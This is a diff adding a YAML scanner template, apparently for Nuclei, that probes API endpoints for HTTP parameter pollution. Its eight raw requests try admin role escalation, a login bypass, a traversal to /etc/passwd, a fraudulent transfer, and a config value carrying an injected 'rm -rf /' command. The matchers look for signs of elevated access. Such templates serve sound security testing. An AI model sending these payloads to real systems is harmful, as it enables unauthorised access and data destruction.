@@ -1,0 +1,138 @@
+id: api-parameter-pollution-duplicate
+
+info:
+  name: API Parameter Pollution - Duplicate Parameter Attack
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced HTTP Parameter Pollution (HPP) attack template targeting API endpoints.
+    Tests multiple parameter pollution techniques used by red teams to bypass
+    input validation, authentication, and authorization controls.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
+    - https://portswigger.net/web-security/logic-flaws/examples
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-235
+  tags: api,hpp,parameter-pollution,injection,bypass,red-team
+
+http:
+  - raw:
+      # Test 1: Basic parameter duplication with different values
+      - |
+        GET /api/user?id=1&id=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+        Accept: application/json
+        
+      # Test 2: Parameter pollution with admin privilege escalation
+      - |
+        POST /api/user/update HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+        
+        user_id=123&role=user&user_id=1&role=admin
+        
+      # Test 3: JSON parameter pollution via form encoding
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=normaluser&password=pass123&username=admin&password=admin123
+        
+      # Test 4: Array parameter pollution bypass
+      - |
+        GET /api/files?file[]=safe.txt&file[]=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 5: Mixed parameter pollution (GET + POST)
+      - |
+        POST /api/transfer?amount=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        amount=1000000&to_account=attacker123
+        
+      # Test 6: Parameter pollution with URL encoding variations
+      - |
+        GET /api/search?q=normal&q=%61%64%6d%69%6e HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 7: Parameter pollution with special characters
+      - |
+        POST /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        setting=safe_value&setting=dangerous;rm -rf /&debug=true
+        
+      # Test 8: Parameter pollution with authentication bypass
+      - |
+        GET /api/admin/users?auth=false&auth=true&admin=1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer invalid_token
+        Accept: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+          - 302
+          
+      - type: word
+        part: body
+        words:
+          - '"admin"'
+          - '"administrator"'
+          - '"root"'
+          - '"success"'
+          - '"authorized"'
+          - '"privilege"'
+          - '"elevated"'
+          - '"bypass"'
+          - '"role":'
+          - '"permissions"'
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "admin"
+          - "session"
+          - "token"
+        condition: or
+        
+      - type: regex
+        part: body
+        regex:
+          - '"id":\s*[0-9]+'
+          - '"user_id":\s*[0-9]+'
+          - '"role":\s*"(admin|administrator|root)"'
+          - '"access_level":\s*[5-9]'
+          - '"is_admin":\s*(true|1)'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: polluted_parameter
+        part: body
+        regex:
+          - '"([^"]+)":\s*"([^"]*admin[^"]*)"'
+          - '"([^"]+)":\s*([0-9]+)'
+          - '"role":\s*"([^"]+)"'
+          
+      - type: kval
+        part: header
+        kval:
+          - Set-Cookie
+          - Location
+          - X-Admin-Token
